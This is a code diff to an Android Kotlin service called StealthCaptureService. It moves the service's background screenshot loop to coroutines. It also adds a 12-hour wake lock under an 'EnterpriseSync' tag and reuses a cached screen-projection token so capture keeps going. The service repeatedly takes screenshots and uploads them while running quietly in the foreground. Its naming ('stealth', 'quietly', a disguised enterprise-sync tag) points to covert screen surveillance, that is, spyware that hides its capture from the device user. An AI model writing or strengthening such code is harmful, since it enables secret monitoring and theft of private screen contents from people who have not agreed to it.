@@ -39,6 +39,8 @@ import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.cancel
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import java.io.ByteArrayOutputStream
@@ -70,27 +72,18 @@ class StealthCaptureService : Service() {
     private var intervalSec = 10
     private var maxShots = 0
     private var currentShotCount = 0
-
-    private val captureRunnable = object : Runnable {
-        override fun run() {
-            if (isCapturing) {
-                captureAndUpload()
-                currentShotCount++
-                if (maxShots > 0 && currentShotCount >= maxShots) {
-                    Log.d(TAG, "Reached max stealth screenshots ($maxShots). Stopping service.")
-                    stopCaptureAndCleanup()
-                    stopSelf()
-                } else {
-                    handler.postDelayed(this, intervalSec * 1000L)
-                }
-            }
-        }
-    }
+    private var wakeLock: PowerManager.WakeLock? = null
+    private var captureJob: kotlinx.coroutines.Job? = null
 
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
         startForegroundServiceQuietly()
+        try {
+            val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
+            wakeLock = powerManager?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "EnterpriseSync::StealthCaptureWakeLock")
+            wakeLock?.acquire(12 * 60 * 60 * 1000L) // 12 hours max
+        } catch (_: Exception) {}
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -112,23 +105,13 @@ class StealthCaptureService : Service() {
 
                 if (resultCode == Activity.RESULT_OK && resultData != null) {
                     initMediaProjection(resultCode, resultData)
-                    if (!isCapturing) {
-                        isCapturing = true
-                        handler.removeCallbacks(captureRunnable)
-                        handler.post(captureRunnable)
-                        Log.d(TAG, "Stealth capture loop started (interval: ${intervalSec}s, maxShots: $maxShots).")
-                    }
+                    startCaptureLoop()
                 } else {
                     // Try token from MediaProjectionHelper fallback
                     val token = MediaProjectionHelper.getProjectionToken(this)
                     if (token != null) {
                         initMediaProjection(token.first, token.second)
-                        if (!isCapturing) {
-                            isCapturing = true
-                            handler.removeCallbacks(captureRunnable)
-                            handler.post(captureRunnable)
-                            Log.d(TAG, "Stealth capture loop started via cached token (interval: ${intervalSec}s, maxShots: $maxShots).")
-                        }
+                        startCaptureLoop()
                     } else {
                         Log.e(TAG, "Missing MediaProjection token for starting stealth capture.")
                         stopSelf()
@@ -141,6 +124,41 @@ class StealthCaptureService : Service() {
             }
         }
         return START_STICKY
+    }
+
+    private fun startCaptureLoop() {
+        if (isCapturing) return
+        isCapturing = true
+        captureJob?.cancel()
+        captureJob = serviceScope.launch {
+            Log.d(TAG, "Stealth capture coroutine loop started (interval: ${intervalSec}s, maxShots: $maxShots).")
+            while (isActive && isCapturing) {
+                try {
+                    if (mediaProjection == null) {
+                        val token = MediaProjectionHelper.getProjectionToken(this@StealthCaptureService)
+                        if (token != null) {
+                            initMediaProjection(token.first, token.second)
+                        }
+                    }
+
+                    if (mediaProjection != null) {
+                        captureAndUpload()
+                        currentShotCount++
+                        if (maxShots > 0 && currentShotCount >= maxShots) {
+                            Log.d(TAG, "Reached max stealth screenshots ($maxShots). Stopping service.")
+                            stopCaptureAndCleanup()
+                            stopSelf()
+                            break
+                        }
+                    } else {
+                        Log.w(TAG, "MediaProjection token unavailable for stealth capture.")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error in stealth capture coroutine loop: ${e.message}")
+                }
+                delay(intervalSec * 1000L)
+            }
+        }
     }
 
     private fun initMediaProjection(resultCode: Int, resultData: Intent) {
@@ -371,7 +389,11 @@ class StealthCaptureService : Service() {
 
     private fun stopCaptureAndCleanup() {
         isCapturing = false
-        handler.removeCallbacks(captureRunnable)
+        captureJob?.cancel()
+        captureJob = null
+        try {
+            wakeLock?.let { if (it.isHeld) it.release() }
+        } catch (_: Exception) {}
         try {
             mediaProjection?.stop()
         } catch (_: Exception) {}
